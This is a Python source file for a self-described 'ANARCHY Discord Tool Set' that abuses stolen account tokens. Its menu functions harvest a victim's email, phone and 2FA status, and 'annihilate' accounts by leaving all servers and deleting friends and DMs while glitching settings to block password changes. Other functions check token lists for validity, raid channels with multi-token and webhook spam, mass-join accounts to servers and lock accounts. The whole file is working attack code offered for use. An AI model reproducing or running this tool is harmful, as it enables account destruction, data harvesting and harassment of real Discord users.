import requests
import json
from os import system
import os
import time

idBots = [9972, 4621, 5760, 6568, 1012, 6517, 7959, 2816, 7666, 7755, 4632, 8093, 3979, 6463, 4922] #For name Observer

cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear') 

exitMenu = '''\nTo return to the menu, use the combination Ctrl + C.
'''

webhookMenu = '''[1] - 1 Webhhook.
[2] - Spam webhook from webhooks.txt.
[3] - Spam via token with webhook rights.
'''
spamMenu = '''[1] - Spam in 1 chat.
[2] - Spam to all chats.
'''
validationMenu = '''[1] - Сheck 1 token.
[2] - Check all tokens.
'''
leaverMenu = '''[1] - Leave 1 token.
[2] - Leave all tokens.
'''
joinerMenu = '''[1] - Join 1 token.
[2] - Join all tokens.
'''
noMenu = '''Menu not included.
'''

helps = '''[1] - With this item, you can collect some information that is in the user's account.
[2] - This item will cause great damage to the account, it will delete all friends, and exit all servers in which it belongs (except those where the user is the owner), during this destruction, glitches will be used to avoid changing the password.
[3] - This spammer will spam through the webhook, to the server, with your text.
[4] - This item will allow you to find out if the token is valid.
[5] - This item will add a user account to the server you specified.  You can add 1-2 tokens manually, or a group of tokens from the tokens.txt text file, the tokens in which must be line by line.
[6] - This item will cause a lot of crashes on the account, with a change in theme and language.  This is not critical, but it can be inconvenient.
[7] - This item will allow you to install a temporary block on your account, which can be removed, confirmed the account by phone number.
[8] - This item will remove your tokens from the specified server.
[9] - This item was created for raiding servers. You can raid in one, or all chats at the same time.
[10] - This item.
[11] - Exit.
'''
#Webhook spam----------------------------------------------+

def Webhook_spam():
    print(exitMenu)
    print(webhookMenu)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            webhook = str(input('\nWebhook: '))
            hookName = str(input('\nWebhook name: '))
            hookAvatar = str(input('\nWebhook avatar: '))
            hookMessage = str(input('\nMessage : '))
            print('\nSpam started.')
            while True:
                info = {'content':hookMessage,'username':hookName,'avatar_url':hookAvatar}
                requests.post(webhook, data=info)
        elif select == '2':
            hookName = str(input('\nWebhook name: '))
            hookAvatar = str(input('\nWebhook avatar: '))
            hookMessage = str(input('\nMessage: '))
            print('\nSpam started!')
            while True:
                with open('webhooks.txt','r') as handle:
                    webhooks = handle.readlines()
                    for x in webhooks:
                        webhook = x.rstrip()
                        info = {'content':hookMessage,'username':hookName,'avatar_url':hookAvatar}
                        requests.post(webhook, data=info)
        elif select == '3':
            channels = []
            file = open('webhooks.txt', 'w')
            token = input('\nToken: ')
            serverID = input('\nServer id: ')
            hookName = str(input('\nWebhook name: '))
            hookAvatar = str(input('\nWebhook avatar: '))
            hookMessage = str(input('\nMessage : '))
            headers = {'Authorization': token}
            request = requests.get(f'https://discord.com/api/v8/guilds/{serverID}/channels', headers=headers)
            for channel in request.json():
                if channel["type"] == 0:
                    channels.append(channel['id'])
            for channelID in channels:
                header = {'Content-Type': 'application/json', 'Authorization': token,}
                json = {'name': 'AnarchyRAT;', 'avatar': None}
                request = requests.post(f'https://discord.com/api/v8/channels/{channelID}/webhooks', headers=headers, json=json)
                data = request.json()
                webhookID = data['id']
                webhookToken = data['token']
                file.write(f'https://discordapp.com/api/webhooks/{webhookID}/{webhookToken}\n')
            print('\nSpam started.')
            file.close()
            while True:
                with open('webhooks.txt','r') as handle:
                    webhooks = handle.readlines()
                    for x in webhooks:
                        webhook = x.rstrip()
                        info = {'content':hookMessage,'username':hookName,'avatar_url':hookAvatar}
                        requests.post(webhook, data=info)
        else:
            print('\nInvalid option.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')

#Spam----------------------------------------------+

def spam():
    print(exitMenu)
    print(spamMenu)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            channelID = input('\nChannel ID: ')
            messages1 = input('\nMessage [1]: ')
            messages2 = input('\nMessage [2]: ')
            print('\nSpam started.')
            while True:
                with open('tokens.txt','r') as handle:
                    tokens = handle.readlines()
                    for x in tokens:
                        token = x.rstrip()
                        headers = {'Authorization': token}
                        json1 = {'content': messages1}
                        json2 = {'content': messages2}
                        requests.post(f'https://discord.com/api/v8/channels/{channelID}/messages', json=json1, headers=headers)
                        requests.post(f'https://discord.com/api/v8/channels/{channelID}/messages', json=json2, headers=headers)
        elif select == '2':
            serverID = input('\nServer ID: ')
            messages1 = input('\nMessage [1]: ')
            messages2 = input('\nMessage [2]: ')
            print('\nSpam started.')
            channels = []
            with open('tokens.txt','r') as handle:
                tokens = handle.readlines()
                token = tokens[1]
                headers = {'Authorization': token}
                request = requests.get(f'https://discord.com/api/v8/guilds/{serverID}/channels', headers=headers)
                for channel in request.json():
                    if channel["type"] == 0:
                        channels.append(channel['id'])
                while True:
                    for channelID in channels:
                        with open('tokens.txt','r') as handle:
                            tokens = handle.readlines()
                            for x in tokens:
                                token = x.rstrip()
                                headers = {'Authorization': token}
                                json1 = {'content': messages1}
                                json2 = {'content': messages2}
                                requests.post(f'https://discord.com/api/v8/channels/{channelID}/messages', json=json1, headers=headers)
                                requests.post(f'https://discord.com/api/v8/channels/{channelID}/messages', json=json2, headers=headers)
        else:
            print('\nIvalid option.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')
         
#Token Validation----------------------------------------------+

def validToken():
    print(exitMenu)
    print(validationMenu)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            token = input('\nToken: ')
            headers = {'Authorization': token}
            request = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=headers)
            if request.status_code == 200:
                print(token + ' Valid.')
            else:
                print(token + ' Invalid.')
        elif select == '2':
            with open('tokens.txt','r') as handle:
                tokens = handle.readlines()
                for x in tokens:
                    token = x.rstrip()
                    headers = {'Authorization': token}
                    request = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=headers)
                    if request.status_code == 200:
                        print(token + ' Valid.')
                    else:
                        print(token + ' Invalid.')
        else:
            print('\nInvalid option.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')

#Locker----------------------------------------------+

def locker(idBots):
    print(exitMenu)
    print(noMenu)
    try:
        token = input('\nToken: ')
        headers = {'Authorization': token}
        for ID in idBots:
            json={'username': 'Observer', 'discriminator': ID}
            requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json=json)
        print('\nLock successful.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')

#Leaver----------------------------------------------+

def leaver():
    print(exitMenu)
    print(leaverMenu)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            token = input('\nToken: ')
            serverID = input('\nServer ID: ')
            headers = {'Authorization': token}
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{serverID}', headers=headers)
            print('Token leaved.')
        elif select == '2':
            serverID = input('\nServer ID: ')
            with open('tokens.txt','r') as handle:
                tokens = handle.readlines()
                for x in tokens:
                    token = x.rstrip()
                    headers = {'Authorization': token}
                    requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{serverID}', headers=headers)
            print('\nAll valid tokens have Leaved!')
        else:
            print('\nInvalid option.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')

#Joiner----------------------------------------------+

def joinToken():
    print(exitMenu)
    print(joinerMenu)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            link = input('\nDiscord Invite Link: ')
            if len(link) > 6:
                link = link[19:]
            apilink = (f'https://discordapp.com/api/v6/invite/{link}')
            token = input('\nToken: ')
            headers = {'Authorization': token}
            requests.post(apilink, headers=headers)
            print('\nToken joined.')
        elif select == '2':
            link = input('\nDiscord Invite Link: ')
            if len(link) > 6:
                link = link[19:]
            apilink = (f'https://discordapp.com/api/v6/invite/{link}')
            with open('tokens.txt','r') as handle:
                tokens = handle.readlines()
            for x in tokens:
                token = x.rstrip()
                headers = {'Authorization': token}
                requests.post(apilink, headers=headers)
            print('\nAll valid tokens have joined.')
        else:
            print('\nInvalid option.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')
	
#Annihilation----------------------------------------------+

def tokenAnnihilation():
    print(exitMenu)
    print(noMenu)
    try:
        token = input('\nToken: ')
        servers = input('\nName of servers: ')
        headers = {'Authorization': token}
        headers2 = {'Content-Type': 'application/json', 'Authorization': token}
        payload = {'name': f'{servers}', 'region': 'europe', 'icon': None, 'channels': None}
        setting = {'theme': 'light', 'locale': 'zh-CN'}
        setting2 = {'theme': 'dark', 'locale': 'zh-TW'}
        serversId = []
        friendsId = []
        dmId = []
        c = 100
        d = 0
        print('\nStarted annihilation.')
        request = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=headers)
        for server in request.json():
            serversId.append(server['id'])
        for serversID in serversId:
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{serversID}', headers=headers)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting2)
        request = requests.get('https://discord.com/api/v8/users/@me/channels', headers=headers)
        for dm in request.json():
            dmId.append(dm['id'])
        for dmID in dmId:
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)
            requests.delete(f'https://discord.com/api/v8/channels/{dmID}', headers=headers2)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting2)
        request2 = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
        for friend in request2.json():
            friendsId.append(friend['id'])
        for friendsID in friendsId:
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)
            requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friendsID}', headers=headers)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting2)
        while d <= c:
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)
            requests.post('https://discord.com/api/v8/guilds', headers=headers, json=payload)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting2)
            d = d + 1
        print('Started gliched.')
        while True:
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting2)
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('Press key to continue.')

#Glitcher----------------------------------------------+

def glitch():
    print(exitMenu)
    print(noMenu)
    try:
        token = input('\nToken: ')
        headers = {'Authorization': token}
        setting = {'theme': 'light', 'locale': 'zh-CN'}
        setting2 = {'theme': 'dark', 'locale': 'zh-TW'}
        print('\nStarted glitches.')
        while True:
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)
            requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting2)
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('\nPress key to continue.')

#Grab Info----------------------------------------------+

def grabInfo():
    print(exitMenu)
    print(noMenu)
    try:
        token = input('\nToken: ')
        headers = {'Authorization': token, 'Content-Type': 'application/json'}  
        request = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=headers)
        if request.status_code == 200:
            userName = request.json()['username'] + '#' + request.json()['discriminator']
            userID = request.json()['id']
            phone = request.json()['phone']
            email = request.json()['email']
            mfa = request.json()['mfa_enabled']
            print(f'''\n
  User Name: {userName}
  User ID: {userID}
  2 Factor: {mfa}
  Email: {email}
  Phone Number: {phone if phone else 'None.'}
            ''')
        else:
            print(token + ' Invalid.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('\nPress key to continue.')       

#Menu----------------------------------------------+

intro = '''
 [===========================================]
 
 [ ANARCHY ]~>
 
 [ Discord Tool Set. 
 [ version 1.2        
 [ Created by Cyber-Crypto.Anarchy.Squad
 [ Telegram C.A.S - https://t.me/anarchy_squad
 [ elegram Hydra crash bots - https://t.me/EvLVHydraNews 
 
 [1]  Grab Info
 [2]  Annihilation
 [3]  Webhook spamm
 [4]  Check Token (Valid/Invalid)
 [5]  Joiner
 [6]  Glitcher
 [7]  Locker
 [8]  Leaver
 [9]  Spamm 
 [10] Help
 [11] Exit
 
 [===========================================]
 
 '''

 #Interaction----------------------------------------------+

while True:
    cls()
    print(intro)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            grabInfo()
        elif select == '2':
            tokenAnnihilation()
        elif select == '3':
            Webhook_spam()
        elif select == '4':
            validToken()
        elif select == '5':
            joinToken()
        elif select == '6':
            glitch()
        elif select == '7':
            locker(idBots)
        elif select == '8':
            leaver()
        elif select == '9':
            spam()
        elif select == '10':
            print(helps)
            nextCode = input('\nPress key to continue.')
        elif select == '11':
            print('\nGoodby!')
            time.sleep(2)
            exit()
        else:
            print('\nInvalid option.')
            nextCode = input('\nPress key to continue.')
    except KeyboardInterrupt:
        print('\nUse Item 11.')
        time.sleep(3)
	
